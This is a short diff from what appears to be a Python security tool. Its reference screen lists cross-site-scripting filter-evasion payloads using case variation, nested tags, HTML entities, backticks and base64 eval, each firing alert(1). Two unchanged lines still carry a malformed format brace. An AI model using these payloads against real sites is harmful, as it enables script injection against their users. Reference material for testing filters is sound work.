@@ -141,7 +141,7 @@ def show_reference():
 
   {Fore.WHITE}<ScRiPt>alert(1)</ScRiPt>{Fore.RESET}                    (Case variation)
   {Fore.WHITE}<scr<script>ipt>alert(1)</scr</script>ipt>{Fore.RESET}      (Nested tags)
-  {Fore.WHITE>&#60;script&#62;alert(1)&#60;/script&#62;{Fore.RESET}    (HTML entities)
+  {Fore.WHITE}&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;{Fore.RESET} (HTML entities)
   {Fore.WHITE><script>alert`1`</script>{Fore.RESET}                    (Backtick)
   {Fore.WHITE><script>eval(atob("YWxlcnQoMSk="))</script>{Fore.RESET} (Base64)
 
